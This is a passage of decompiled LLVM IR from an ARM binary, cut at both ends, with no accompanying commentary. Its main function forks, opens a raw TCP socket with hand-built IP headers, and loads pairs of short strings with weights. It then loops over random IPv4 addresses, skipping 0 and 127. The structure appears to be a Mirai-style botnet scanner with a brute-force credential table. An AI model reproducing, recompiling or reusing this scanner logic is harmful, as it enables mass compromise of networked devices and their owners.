  %v0_fb74 = load i32, i32* %lr.global-to-local, align 4
  %v1_fb74 = add i32 %v0_fb74, 1
  store i32 %v1_fb74, i32* %lr.global-to-local, align 4
  %v3_fb78 = sdiv i32 %v2_fb68, 256
  store i32 %v3_fb78, i32* %r1.global-to-local, align 4
  %v0_fb7c = load i32, i32* %r6.global-to-local, align 4
  %v2_fb7c = add i32 %v2_fb70, 4
  %v3_fb7c = inttoptr i32 %v2_fb7c to i32*
  store i32 %v0_fb7c, i32* %v3_fb7c, align 4
  %v0_fb80 = load i32, i32* %lr.global-to-local, align 4
  %v1_fb80 = load i32, i32* %r8.global-to-local, align 4
  %v2_fb80 = inttoptr i32 %v1_fb80 to i32*
  store i32 %v0_fb80, i32* %v2_fb80, align 4
  %v0_fb84 = load i32, i32* %r1.global-to-local, align 4
  %v1_fb84 = trunc i32 %v0_fb84 to i8
  store i8 %v1_fb84, i8* @global_var_1a70d.191, align 1
  %v0_fb88 = load i32, i32* %r2.global-to-local, align 4
  %v1_fb88 = trunc i32 %v0_fb88 to i8
  store i8 %v1_fb88, i8* bitcast (i8** @global_var_1a70c.190 to i8*), align 4
  ret i32 ptrtoint (i8** @global_var_1a70c.190 to i32)

; uselistorder directives
  uselistorder i32 %v1_faec, { 0, 2, 3, 1 }
  uselistorder i32 %v3_fac0, { 1, 0 }
  uselistorder i32 %v2_fab4, { 1, 0, 2 }
  uselistorder i32 %v1_fa80, { 0, 2, 3, 1 }
  uselistorder i32 %v3_fa54, { 1, 0 }
  uselistorder i32 %v2_fa48, { 1, 0, 2 }
  uselistorder i32 %v3_fa18, { 1, 0 }
  uselistorder i32 %v3_fa10, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i8*)* @function_119dc, { 0, 1, 17, 2, 3, 4, 5, 6, 7, 8, 19, 20, 21, 22, 23, 9, 10, 11, 12, 13, 14, 15, 16, 18 }
  uselistorder i32* (i32*, i32)* @realloc, { 10, 0, 1, 6, 8, 9, 11, 7, 2, 3, 4, 5, 12 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @function_fba0(i32 %arg1) local_unnamed_addr {
dec_label_pc_fba0:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %sp.global-to-local = alloca i32, align 4
  store i32 0, i32* %sp.global-to-local, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-41 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-1842 = alloca i32, align 4
  %stack_var_-1862 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fba0 = load i32, i32* @r4, align 4
  store i32 %v3_fba0, i32* %stack_var_-36, align 4
  %v15_fba0 = load i32, i32* @r8, align 4
  %v18_fba0 = load i32, i32* @sb, align 4
  %v21_fba0 = load i32, i32* @sl, align 4
  %v0_fbac = call i32 @fork()
  store i32 %v0_fbac, i32* %r0.global-to-local, align 4
  %v2_fbb0 = icmp eq i32 %v0_fbac, -1
  %. = zext i1 %v2_fbb0 to i32
  %tmp293 = icmp slt i32 %v0_fbac, 1
  %storemerge252 = select i1 %tmp293, i32 %., i32 1
  store i32 %storemerge252, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1a738.193 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbcc = icmp eq i32 %storemerge252, 0
  store i1 %v2_fbcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_fbac, i32* @global_var_1a738.193, align 4
  br i1 %v2_fbcc, label %dec_label_pc_fbe4, label %dec_label_pc_fbd8

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fba0
  store i32 %v3_fba0, i32* %r4.global-to-local, align 4
  store i32 %v15_fba0, i32* %r8.global-to-local, align 4
  store i32 %v18_fba0, i32* @sb, align 4
  store i32 %v21_fba0, i32* @sl, align 4
  ret i32 %v0_fbac

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_fba0
  %v0_fbe4 = call i32 @function_11c94()
  store i32 %v0_fbe4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a714.104 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_fbe4, i32* @global_var_1a714.104, align 4
  %v1_fbf0 = call i32 @function_f71c(i32 %v0_fbe4)
  %v0_fbf4 = load i32, i32* @r4, align 4
  store i32 %v0_fbf4, i32* %r0.global-to-local, align 4
  %v1_fbf8 = inttoptr i32 %v0_fbf4 to i32*
  %v2_fbf8 = call i32 @time(i32* %v1_fbf8)
  store i32 ptrtoint (i32* @global_var_1a710.184 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_fbf8, i32* @global_var_1a710.184, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_fc0c = call i32* @calloc(i32 256, i32 288)
  %v4_fc0c = ptrtoint i32* %v2_fc0c to i32
  store i32 %v4_fc0c, i32* %lr.global-to-local, align 4
  %v0_fc18 = load i32, i32* @r4, align 4
  store i32 %v0_fc18, i32* %stack_var_-52, align 4
  store i32 %v4_fc0c, i32* @global_var_1a730.197, align 4
  store i32 %v0_fc18, i32* %r3.global-to-local, align 4
  store i32 %v0_fc18, i32* @r5, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v0_fc18, i32* %ip.global-to-local, align 4
  %v1_fc30 = add i32 %v4_fc0c, 4
  store i32 %v1_fc30, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fc34

dec_label_pc_fc34:                                ; preds = %dec_label_pc_fc34.dec_label_pc_fc34_crit_edge, %dec_label_pc_fbe4
  %v0_fc4c = phi i32 [ %v0_fc4c.pre, %dec_label_pc_fc34.dec_label_pc_fc34_crit_edge ], [ %v0_fc18, %dec_label_pc_fbe4 ]
  %v0_fc3c = phi i32 [ %v0_fc54, %dec_label_pc_fc34.dec_label_pc_fc34_crit_edge ], [ %v0_fc18, %dec_label_pc_fbe4 ]
  %v1_fc44 = phi i32 [ %v1_fc44.pre, %dec_label_pc_fc34.dec_label_pc_fc34_crit_edge ], [ %v4_fc0c, %dec_label_pc_fbe4 ]
  %v3_fc34 = mul i32 %v0_fc3c, 256
  store i32 %v3_fc34, i32* %r2.global-to-local, align 4
  %v1_fc3c = add i32 %v0_fc3c, 1
  store i32 %v1_fc3c, i32* %ip.global-to-local, align 4
  %v2_fc40 = mul i32 %v0_fc3c, 288
  %v2_fc44 = add i32 %v1_fc44, 12
  %v2_fc4c = add i32 %v2_fc44, %v2_fc40
  %v3_fc4c = inttoptr i32 %v2_fc4c to i32*
  store i32 %v0_fc4c, i32* %v3_fc4c, align 4
  %v0_fc50 = load i32, i32* %r0.global-to-local, align 4
  %v1_fc50 = load i32, i32* %r1.global-to-local, align 4
  %v2_fc50 = inttoptr i32 %v1_fc50 to i32*
  store i32 %v0_fc50, i32* %v2_fc50, align 4
  %v3_fc50 = load i32, i32* %r1.global-to-local, align 4
  %v4_fc50 = add i32 %v3_fc50, 288
  store i32 %v4_fc50, i32* %r1.global-to-local, align 4
  %v0_fc54 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_fc54, i32* %r3.global-to-local, align 4
  %v7_fc58 = icmp sgt i32 %v1_fc3c, 255
  br i1 %v7_fc58, label %dec_label_pc_fc5c, label %dec_label_pc_fc34.dec_label_pc_fc34_crit_edge

dec_label_pc_fc34.dec_label_pc_fc34_crit_edge:    ; preds = %dec_label_pc_fc34
  %v1_fc44.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_fc4c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fc34

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fc34
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 %v0_fc54, i32* %stack_var_-52, align 4
  %v3_fc6c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_fc6c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a734.199 to i32), i32* %lr.global-to-local, align 4
  %v2_fc74 = icmp eq i32 %v3_fc6c, -1
  store i1 %v2_fc74, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fc74, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_fc6c, i32* %r4.global-to-local, align 4
  store i32 %v3_fc6c, i32* @global_var_1a734.199, align 4
  br i1 %v2_fc74, label %dec_label_pc_10444, label %dec_label_pc_fc84

dec_label_pc_fc84:                                ; preds = %dec_label_pc_fc5c
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_fc88 = load i32, i32* @r5, align 4
  store i32 %v0_fc88, i32* %r2.global-to-local, align 4
  %v2_fc8c = call i32 (i32, i32, ...) @fcntl(i32 %v3_fc6c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_fc94 = or i32 %v2_fc8c, 2048
  store i32 %v1_fc94, i32* %r2.global-to-local, align 4
  %v0_fc98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fc98, i32* %r0.global-to-local, align 4
  %v2_fc9c = call i32 (i32, i32, ...) @fcntl(i32 %v0_fc98, i32 4)
  %v2_fca8 = load i32, i32* @global_var_1a734.199, align 4
  store i32 %v2_fca8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_fcb0 = load i32, i32* @r5, align 4
  store i32 %v0_fcb0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_fcb8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_fcb8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r4.global-to-local, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v7_fcc8 = call i32 @setsockopt(i32 %v2_fca8, i32 %v0_fcb0, i32 3, i32* nonnull %stack_var_-52, i32 4)
  store i32 %v7_fcc8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fccc = icmp eq i32 %v7_fcc8, 0
  store i1 %v2_fccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fccc, label %dec_label_pc_fcd4, label %dec_label_pc_10534

dec_label_pc_fcd4:                                ; preds = %dec_label_pc_fc84, %dec_label_pc_fcd4
  %v0_fcd4 = call i32 @function_f6c4()
  %v3_fcd8 = mul i32 %v0_fcd4, 65536
  store i32 %v3_fcd8, i32* %r0.global-to-local, align 4
  %v1_fce4 = mul i32 %v0_fcd4, 256
  %v3_fce8 = and i32 %v1_fce4, 65280
  %tmp296 = udiv i32 %v0_fcd4, 256
  %v4_fcec = urem i32 %tmp296, 256
  %v5_fcec = or i32 %v4_fcec, %v3_fce8
  store i32 %v5_fcec, i32* %r3.global-to-local, align 4
  %v2_fcf0 = icmp ugt i32 %v5_fcec, 1023
  store i1 %v2_fcf0, i1* %cpsr_c.global-to-local, align 1
  %v7_fcf0 = icmp eq i32 %v5_fcec, 1024
  store i1 %v7_fcf0, i1* %cpsr_z.global-to-local, align 1
  %v3_fcf4 = icmp ult i32 %v5_fcec, 1022
  br i1 %v3_fcf4, label %dec_label_pc_fcd4, label %dec_label_pc_fcf8

dec_label_pc_fcf8:                                ; preds = %dec_label_pc_fcd4
  %v5_fce0.le = trunc i32 %v0_fcd4 to i8
  store i32 ptrtoint (i32* @global_var_1a6e0.201 to i32), i32* %ip.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i8 69, i8* bitcast (i32* @global_var_1a6e0.201 to i8*), align 4
  store i8 40, i8* bitcast (i32* @global_var_1a6e3.202 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1a6e2.203 to i8*), align 4
  %v0_fd2c = call i32 @function_f6c4()
  %v1_fd2c = trunc i32 %v0_fd2c to i8
  store i32 %v0_fd2c, i32* %r0.global-to-local, align 4
  %v3_fd34 = load i8, i8* @global_var_1a700.206, align 1
  store i32 ptrtoint (i32* @global_var_1a6e0.201 to i32), i32* %lr.global-to-local, align 4
  %v4_fd3c251 = udiv i32 %v0_fd2c, 256
  %v1_fd40 = trunc i32 %v4_fd3c251 to i8
  store i8 %v1_fd40, i8* bitcast (i32* @global_var_1a6e5.207 to i8*), align 4
  %v4_fd44 = sext i8 %v5_fce0.le to i32
  store i8 6, i8* bitcast (i32* @global_var_1a6e9.208 to i8*), align 4
  %tmp = urem i8 %v3_fd34, 16
  %v1_fd50 = zext i8 %tmp to i32
  store i32 ptrtoint (i32* @global_var_1a6f4.205 to i32), i32* %r2.global-to-local, align 4
  %v1_fd58 = and i32 %v4_fd44, 128
  %v2_fd58 = icmp ne i32 %v1_fd58, 0
  store i1 %v2_fd58, i1* %cpsr_c.global-to-local, align 1
  %v3_fd58 = sdiv i32 %v4_fd44, 256
  store i32 %v3_fd58, i32* %ip.global-to-local, align 4
  %v1_fd5c = or i32 %v1_fd50, 80
  store i32 %v1_fd5c, i32* %r1.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_1a6e8.209 to i8*), align 4
  %v1_fd68 = trunc i32 %v1_fd5c to i8
  store i8 %v1_fd68, i8* @global_var_1a700.206, align 1
  store i8 23, i8* bitcast (i32* @global_var_1a6f7.210 to i8*), align 4
  store i32 %v4_fd44, i32* %r3.global-to-local, align 4
  %v1_fd78 = trunc i32 %v3_fd58 to i8
  store i8 %v1_fd78, i8* bitcast (i32* @global_var_1a6f5.211 to i8*), align 4
  store i8 %v1_fd2c, i8* bitcast (i32* @global_var_1a6e4.212 to i8*), align 4
  store i8 %v5_fce0.le, i8* bitcast (i32* @global_var_1a6f4.205 to i8*), align 4
  %v0_fd84 = load i32, i32* @r5, align 4
  %v1_fd84 = trunc i32 %v0_fd84 to i8
  store i8 %v1_fd84, i8* bitcast (i32* @global_var_1a6f6.213 to i8*), align 4
  %v0_fd88 = call i32 @function_f6c4()
  %v1_fd88 = trunc i32 %v0_fd88 to i8
  %v3_fd90 = load i8, i8* @global_var_1a701.214, align 1
  %v4_fd90 = zext i8 %v3_fd90 to i32
  store i32 ptrtoint (i32* @global_var_1a6f4.205 to i32), i32* %lr.global-to-local, align 4
  %v2_fd98 = and i32 %v0_fd88, 128
  %v3_fd98 = icmp ne i32 %v2_fd98, 0
  store i1 %v3_fd98, i1* %cpsr_c.global-to-local, align 1
  %v4_fd98 = sdiv i32 %v0_fd88, 256
  store i32 %v4_fd98, i32* %ip.global-to-local, align 4
  %v1_fd9c = or i32 %v4_fd90, 2
  store i32 %v1_fd9c, i32* %r3.global-to-local, align 4
  %v1_fda4 = trunc i32 %v4_fd98 to i8
  store i8 %v1_fda4, i8* bitcast (i32* @global_var_1a703.215 to i8*), align 4
  %v1_fda8 = trunc i32 %v1_fd9c to i8
  store i8 %v1_fda8, i8* @global_var_1a701.214, align 1
  store i8 %v1_fd88, i8* bitcast (i32* @global_var_1a702.216 to i8*), align 4
  store i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_12314.220 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fdbc = call i32 @function_f9fc(i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32 ptrtoint (i32* @global_var_12314.220 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1228c.222 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_fdcc = call i32 @function_f9fc(i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32 ptrtoint ([5 x i8]* @global_var_1228c.222 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_12294.224 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_fddc = call i32 @function_f9fc(i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32 ptrtoint ([9 x i8]* @global_var_12294.224 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_122a0.226 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_122a0.226 to i32), i32* %r1.global-to-local, align 4
  %v5_fdec = call i32 @function_f9fc(i32 ptrtoint ([7 x i8]* @global_var_122a0.226 to i32), i32 ptrtoint ([7 x i8]* @global_var_122a0.226 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_122a8.228 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_12314.220 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_fdfc = call i32 @function_f9fc(i32 ptrtoint ([8 x i8]* @global_var_122a8.228 to i32), i32 ptrtoint (i32* @global_var_12314.220 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_122b0.230 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_fe0c = call i32 @function_f9fc(i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32 ptrtoint ([9 x i8]* @global_var_122b0.230 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_122bc.232 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_122bc.232 to i32), i32* %r1.global-to-local, align 4
  %v5_fe1c = call i32 @function_f9fc(i32 ptrtoint ([6 x i8]* @global_var_122bc.232 to i32), i32 ptrtoint ([6 x i8]* @global_var_122bc.232 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_122c4.234 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_fe2c = call i32 @function_f9fc(i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32 ptrtoint ([6 x i8]* @global_var_122c4.234 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_122cc.236 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_122cc.236 to i32), i32* %r1.global-to-local, align 4
  %v5_fe3c = call i32 @function_f9fc(i32 ptrtoint ([8 x i8]* @global_var_122cc.236 to i32), i32 ptrtoint ([8 x i8]* @global_var_122cc.236 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_122a8.228 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_fe4c = call i32 @function_f9fc(i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32 ptrtoint ([8 x i8]* @global_var_122a8.228 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_122d4.238 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_fe5c = call i32 @function_f9fc(i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32 ptrtoint (i32* @global_var_122d4.238 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_122e4.240 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_fe6c = call i32 @function_f9fc(i32 ptrtoint ([5 x i8]* @global_var_12310.218 to i32), i32 ptrtoint ([6 x i8]* @global_var_122e4.240 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_122ec.242 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_122ec.242 to i32), i32* %r1.global-to-local, align 4
  %v5_fe7c = call i32 @function_f9fc(i32 ptrtoint ([5 x i8]* @global_var_122ec.242 to i32), i32 ptrtoint ([5 x i8]* @global_var_122ec.242 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_122ec.242 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_122e4.240 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_fe8c = call i32 @function_f9fc(i32 ptrtoint ([5 x i8]* @global_var_122ec.242 to i32), i32 ptrtoint ([6 x i8]* @global_var_122e4.240 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_122a8.228 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_122f4.244 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_fe9c = call i32 @function_f9fc(i32 ptrtoint ([8 x i8]* @global_var_122a8.228 to i32), i32 ptrtoint (i32* @global_var_122f4.244 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_122a8.228 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_12300.246 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_feac = call i32 @function_f9fc(i32 ptrtoint ([8 x i8]* @global_var_122a8.228 to i32), i32 ptrtoint (i32* @global_var_12300.246 to i32), i32 15)
  %v2_feb4 = ptrtoint i32* %stack_var_-1862 to i32
  store i32 %v2_feb4, i32* %r0.global-to-local, align 4
  %v2_feb8 = ptrtoint i32* %stack_var_-1842 to i32
  store i32 %v2_feb8, i32* %r1.global-to-local, align 4
  %tmp297 = bitcast i32* %stack_var_-1842 to i8*
  %v1_10258 = add i32 %v2_feb4, 16
  %v2_10258 = inttoptr i32 %v1_10258 to i32*
  %v1_1027c = or i32 %v2_feb8, 1
  %v2_1027c = inttoptr i32 %v1_1027c to i8*
  %v1_102a0 = or i32 %v2_feb8, 2
  %v2_102a0 = inttoptr i32 %v1_102a0 to i8*
  %v1_102a4 = or i32 %v2_feb8, 3
  %v2_102a4 = inttoptr i32 %v1_102a4 to i8*
  %v1_102bc = add i32 %v2_feb8, 13
  %v2_102bc = inttoptr i32 %v1_102bc to i8*
  %v1_10268 = add i32 %v2_feb4, 9
  %v2_10268 = inttoptr i32 %v1_10268 to i8*
  %v1_102e0 = add i32 %v2_feb8, 8
  %v2_102e0 = inttoptr i32 %v1_102e0 to i32*
  %v1_10320 = add i32 %v2_feb4, 12
  %v2_10320 = inttoptr i32 %v1_10320 to i32*
  %v2_10554 = ptrtoint i32* %stack_var_-36 to i32
  %v2_105d8 = ptrtoint i32* %stack_var_-76 to i32
  %v2_105dc = ptrtoint i32* %stack_var_-348 to i32
  %tmp340 = bitcast i32* %stack_var_-348 to %_TYPEDEF_fd_set*
  %v2_105e4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_105e8 = ptrtoint i32* %stack_var_-220 to i32
  %tmp341 = bitcast i32* %stack_var_-220 to %_TYPEDEF_fd_set*
  %tmp343 = bitcast i32* %stack_var_-64 to %timeval*
  %v2_10f94 = ptrtoint i32* %stack_var_-41 to i32
  %v2_10fa4 = ptrtoint i32* %stack_var_-73 to i32
  %v2_10780 = ptrtoint i32* %stack_var_-56 to i32
  %v2_10c78 = ptrtoint i32* %stack_var_-48 to i32
  %v2_101cc = ptrtoint i32* %stack_var_-92 to i32
  %tmp298 = bitcast i32* %stack_var_-92 to %sockaddr*
  br label %dec_label_pc_fec4

dec_label_pc_fec4:                                ; preds = %dec_label_pc_10644, %dec_label_pc_fcf8
  store i32 ptrtoint (i32* @global_var_1a710.184 to i32), i32* %r2.global-to-local, align 4
  %v2_fec8 = load i32, i32* @global_var_1a710.184, align 4
  store i32 %v2_fec8, i32* %r8.global-to-local, align 4
  %v0_fecc = load i32, i32* @fp, align 4
  %v3_fecc = icmp uge i32 %v0_fecc, %v2_fec8
  store i1 %v3_fecc, i1* %cpsr_c.global-to-local, align 1
  %v9_fecc = icmp eq i32 %v0_fecc, %v2_fec8
  store i1 %v9_fecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fecc, label %dec_label_pc_101f8, label %dec_label_pc_fed4

dec_label_pc_fed4:                                ; preds = %dec_label_pc_fec4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_fee0

dec_label_pc_fee0:                                ; preds = %.thread68.dec_label_pc_fee0_crit_edge, %dec_label_pc_fed4
  %v0_fee0 = phi i32 [ %v0_fee0.pre, %.thread68.dec_label_pc_fee0_crit_edge ], [ 0, %dec_label_pc_fed4 ]
  store i32 %v0_fee0, i32* %stack_var_-92, align 4
  %v0_fef0 = call i32 @function_f6c4()
  %v1_fef0 = trunc i32 %v0_fef0 to i8
  store i32 %v0_fef0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a714.104 to i32), i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6e0.201 to i32), i32* %lr.global-to-local, align 4
  %v2_fefc = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_fefc, i32* %r2.global-to-local, align 4
  %v2_ff00 = and i32 %v0_fef0, 128
  %v3_ff00 = icmp ne i32 %v2_ff00, 0
  store i1 %v3_ff00, i1* %cpsr_c.global-to-local, align 1
  %v4_ff00 = sdiv i32 %v0_fef0, 256
  store i32 %v4_ff00, i32* %r3.global-to-local, align 4
  %v1_ff04 = trunc i32 %v4_ff00 to i8
  store i8 %v1_ff04, i8* bitcast (i32* @global_var_1a6e5.207 to i8*), align 4
  store i32 %v2_fefc, i32* @global_var_1a6ec.247, align 4
  store i8 %v1_fef0, i8* bitcast (i32* @global_var_1a6e4.212 to i8*), align 4
  br label %dec_label_pc_ff10

dec_label_pc_ff10:                                ; preds = %dec_label_pc_10068, %dec_label_pc_ff40, %dec_label_pc_1009c, %dec_label_pc_10090, %dec_label_pc_10084, %dec_label_pc_10078, %.thread53, %.thread37, %.thread33, %.thread29, %bb324, %bb323, %bb322, %bb321, %bb320, %bb319, %bb318, %bb317, %bb316, %bb315, %dec_label_pc_ffdc, %dec_label_pc_ffd4, %bb309, %dec_label_pc_ffa4, %dec_label_pc_ff80, %bb302, %dec_label_pc_ff50, %bb301, %dec_label_pc_ff38, %bb300, %bb326, %dec_label_pc_fee0
  %v0_ff10 = call i32 @function_f6c4()
  store i32 %v0_ff10, i32* %r0.global-to-local, align 4
  %v1_ff14 = urem i32 %v0_ff10, 256
  store i32 %v1_ff14, i32* %r1.global-to-local, align 4
  %v3_ff18 = udiv i32 %v0_ff10, 256
  store i32 %v3_ff18, i32* %r3.global-to-local, align 4
  %v3_ff1c = udiv i32 %v0_ff10, 65536
  store i32 %v3_ff1c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff20 = icmp eq i32 %v1_ff14, 0
  store i1 %v2_ff20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff20, label %bb300, label %bb299

bb299:                                            ; preds = %dec_label_pc_ff10
  %v3_ff24 = icmp ugt i32 %v1_ff14, 126
  store i1 %v3_ff24, i1* %cpsr_c.global-to-local, align 1
  %v8_ff24 = icmp eq i32 %v1_ff14, 127
  store i1 %v8_ff24, i1* %cpsr_z.global-to-local, align 1
  br label %bb300

bb300:                                            ; preds = %dec_label_pc_ff10, %bb299
  %v0_ff34 = phi i1 [ true, %dec_label_pc_ff10 ], [ %v8_ff24, %bb299 ]
  %v1_ff28 = urem i32 %v3_ff18, 256
  store i32 %v1_ff28, i32* %ip.global-to-local, align 4
  %v1_ff2c = urem i32 %v3_ff1c, 256
  store i32 %v1_ff2c, i32* %r2.global-to-local, align 4
  %v1_ff30 = and i32 %v0_ff10, 8388608
  %v2_ff30 = icmp ne i32 %v1_ff30, 0
  store i1 %v2_ff30, i1* %cpsr_c.global-to-local, align 1
  %v3_ff30 = udiv i32 %v0_ff10, 16777216
  store i32 %v3_ff30, i32* %r0.global-to-local, align 4
